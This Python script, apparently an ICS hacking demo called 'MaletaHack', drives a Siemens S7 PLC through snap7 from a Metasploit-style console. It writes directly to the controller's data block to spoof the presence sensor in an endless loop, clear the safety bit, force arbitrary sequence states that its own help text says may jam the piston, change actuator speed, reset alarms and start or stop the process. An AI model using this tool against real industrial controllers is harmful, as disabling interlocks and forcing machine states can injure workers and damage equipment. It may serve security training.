import warnings
warnings.filterwarnings("ignore")

import sys
import ctypes
import snap7
from snap7.type import Areas, S7DataItem
from snap7.util import set_int,set_usint,set_real,get_int,get_real


class MaletaHack:
    def __init__(self,ip=""):
        self.ip=ip
        self.client=snap7.client.Client()
        #try:
        self.client.connect(self.ip,0,1)
        #except:
        #    print("")
        
    def setIP(self,ip):
        self.ip=ip

    def connected(self):
        return self.client.get_connected()

    def set_presence(self):
        actual=self.client.db_read(3,8,1)
        actual[0]=actual[0]|16
        self.client.db_write(3,8,actual)
    
    def reset_alarms(self):
        actual=self.client.db_read(3,2,1)
        actual[0]=actual[0]|1
        self.client.db_write(3,2,actual)

    def change_pos(self,pos1,pos2):
        byte=bytearray(1)
        byte=set_usint(byte,0,pos2)
        self.client.db_write(3,25,byte)

    def change_state(self,state):
        byte=bytearray(1)
        byte=set_int(byte,0,state)
        self.client.db_write(3,0,byte)
    
    def start(self):
        actual=self.client.db_read(3,2,1)
        actual[0]=actual[0]|4
        self.client.db_write(3,2,actual)

    def stop(self):
        actual=self.client.db_read(3,2,1)
        actual[0]=actual[0]&251
        self.client.db_write(3,2,actual)

    def get_position(self):
        pos=self.client.db_read(3,4,4)
        print(snap7.util.get_dint(pos,0))

    def get_state(self):
        state=self.client.db_read(3,0,2)
        print(snap7.util.get_int(state,0))

    def no_safety(self):
        actual=self.client.db_read(3,8,1)
        actual[0]=actual[0]&223
        self.client.db_write(3,8,actual)

    def change_speed(self,speed):
        byte=bytearray(1)
        byte=set_usint(byte,0,speed)
        self.client.db_write(3,16,byte)


class Menu:
    def __init__(self):
        self.ip="192.168.2.5"
        self._selected=""
        self._opt=0
        self._selected_pos="0"
        self._selected_state="0"
        self._selected_initial_pos="0"
        self._selected_final_pos="0"
        self._selected_speed="0"
        self.print_welcome()
        self.search()

    def print_welcome(self):
        print(r" ____  __  __  ____  ____  ____  ____    __  __    __    _  _  ____  ____  _____ ")
        print(r"(_   )(  )(  )(  _ \(_  _)(  _ \(_  _)  (  \/  )  /__\  ( \( )(_  _)( ___)(  _  )")
        print(r" / /_  )(__)(  ) _ < _)(_  )   / _)(_    )    (  /(__)\  )  (   )(   )__)  )(_)( ")
        print(r"(____)(______)(____/(____)(_)\_)(____)  (_/\/\_)(__)(__)(_)\_) (__) (____)(_____)")

    def search(self):
        print("1 - set_presence")
        print("2 - reset_alarms")
        print("3 - change_pos")
        print("4 - change_state")
        print("5 - start")
        print("6 - stop")
        print("7 - get_position")
        print("8 - get_state")
        print("9 - no_safety")
        print("10 - change_speed")
        print("11 - exit")

    

    def selected_use(self,text):
        
        if(text[0]=="1" or text[0]=="set_presence"):
            self._selected="set_presence"
            self._opt=1
        elif (text[0]=="2" or text[0]=="reset_alarms"):
            self._selected="reset_alarms"
            self._opt=2
        elif(text[0]=="3" or text[0]=="change_pos"):
            self._selected="change_pos"
            self._opt=3
        elif(text[0]=="4" or text[0]=="change_state"):
            self._selected="change_state"
            self._opt=4
        elif(text[0]=="5" or text[0]=="start"):
            self._selected="start"
            self._opt=5
        elif(text[0]=="6" or text[0]=="stop"):
            self._selected="stop"
            self._opt=6
        elif(text[0]=="7" or text[0]=="get_position"):
            self._selected="get_position"
            self._opt=7
        elif(text[0]=="8" or text[0]=="get_state"):
            self._selected="get_state"
            self._opt=8
        elif(text[0]=="9" or text[0]=="no_safety"):
            self._selected="no_safety"
            self._opt=9
        elif(text[0]=="10" or text[0]=="change_speed"):
            self._selected="change_speed"
            self._opt=10
        else:
            print("Selected option is not correct")
            self.search()

    def help(self):
        if(self._opt==1):
            print("Sets the 'presence sensor' to detected")
        if(self._opt==2):
            print("Reset all the alarms")
        if(self._opt==3):
            print("The user can modify the initial and final positions")
        if(self._opt==4):
            print("The user can alter the sequence. Programmed states are")
            print("0 - stopped")
            print("10 - preparing the driver 1")
            print("11 - preparing the driver 2")
            print("12 - preparing the driver 3")
            print("20 - first position, nearer to the 0")
            print("30 - second position, nearer to the end")
            print("50 - manual mode")
            print("Any other state may block the piston")
        if(self._opt==5):
            print("Run the process")
        if(self._opt==6):
            print("Stops the process")
        if(self._opt==7):
            print("Get actual position")
        if(self._opt==8):
            print("Get actual state")
        if(self._opt==9):
            print("Presence sensor disabled")
        if(self._opt==10):
            print("Change actuator speed")
            print("Introduce a number between 0 and 255")
        if(self._opt==0):
            #self.search()
            print("")
            print("use X -> select the action number X")
            print("exit -> closes the script")
            print("set -> modify a parameter")
            print("show -> shows all the parameters from the selected action")
            print("run -> runs the selected action with current parameters")
            print("help -> this menu")
            print("")
            print("")

    def show(self):
        if(self._opt in [1,2,3,4,5,6,7,8,9,10]):
            print("IP ",self.ip)
        if(self._opt==3):
            print("INITIAL "+self._selected_initial_pos)
            print("FINAL "+self._selected_final_pos)
        if(self._opt==4):
            print("STATE "+self._selected_state)
        if(self._opt==10):
            print("SPEED "+self._selected_speed)

    def set(self,text):
        if(self._opt in [1,2,3,4,5,6,7,8,9,10]):
            if(text[0].lower()=="ip"):
                self.ip=text[1]
        if(self._opt==3):
            if(text[0].lower()=="initial"):
                self._selected_initial_pos=text[1]
            if(text[0].lower()=="final"):
                self._selected_final_pos=text[1]
        if(self._opt==4):
            if(text[0].lower()=="state"):
                self._selected_state=text[1]
        if(self._opt==10):
            if(text[0].lower()=="speed"):
                self._selected_speed=text[1]


    def run(self):
        plc=MaletaHack(self.ip)
        if(plc.connected()==False):
            print("PLC " +plc.ip+" cannot be reached")
        else:
            if(self._opt==1):
                while True:
                    plc.set_presence()
            if(self._opt==2):
                plc.reset_alarms()
            if(self._opt==3):
                plc.change_pos(int(self._selected_initial_pos),int(self._selected_final_pos))
            if(self._opt==4):
                plc.change_state(int(self._selected_state))
            if(self._opt==5):
                plc.start()
            if(self._opt==6):
                plc.stop()
            if(self._opt==7):
                plc.get_position()
            if(self._opt==8):
                plc.get_state()
            if(self._opt==9):
                plc.no_safety()
            if(self._opt==10):
                plc.change_speed(self._selected_speed)


    def console(self):
        text=""
        while(text!="exit" and text != "11"):
            print(self._selected+"> ",end='')
            text=input().lower()

            if(text.split(" ")[0])=="use":
                self.selected_use(text.split(" ")[1:])

            if((text.split(" ")[0])=="search" or (text.split(" ")[0])=="help" and self._selected==""):
                self.search()
            if(text.split(" ")[0])=="help":
                self.help()
            if(text.split(" ")[0])=="show":
                self.show()
            if(text.split(" ")[0])=="set":
                self.set(text.split(" ")[1:])
            if(text.split(" ")[0])=="run":
                self.run()
            
            


x=Menu()
x.console()



